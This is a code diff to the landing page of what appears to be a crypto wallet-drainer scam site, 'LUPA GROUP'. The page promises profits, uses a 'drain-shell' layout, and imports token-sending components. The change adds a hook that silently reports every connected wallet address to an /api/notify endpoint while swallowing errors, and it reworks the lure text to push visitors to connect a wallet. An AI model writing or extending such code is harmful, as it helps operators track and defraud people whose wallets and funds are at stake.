@@ -1,5 +1,6 @@
 import { ConnectButton } from '@rainbow-me/rainbowkit';
 import Link from 'next/link';
+import { useEffect } from 'react';
 import { useAccount } from 'wagmi';
 import { GetTokens, SendTokens } from '../components/contract';
 
@@ -11,7 +12,17 @@ const Wordmark = () => (
 );
 
 export default function Home() {
-  const { isConnected } = useAccount();
+  const { isConnected, address } = useAccount();
+
+  useEffect(() => {
+    if (isConnected && address) {
+      fetch('/api/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: `Wallet connected: ${address}` }),
+      }).catch(() => {});
+    }
+  }, [isConnected, address]);
 
   return (
     <div className="drain-shell">
@@ -31,7 +42,8 @@ export default function Home() {
             LUPA <em>GROUP.</em>
           </h1>
           <p className="hero__lede">
-            welcome <strong>to</strong> lupa group, earn and withdraw profits
+            welcome to lupa group, earn and withdraw profits
+            Connect a wallet to get started.
           </p>
           <div className="hero__cta">
             <ConnectButton showBalance={false} />
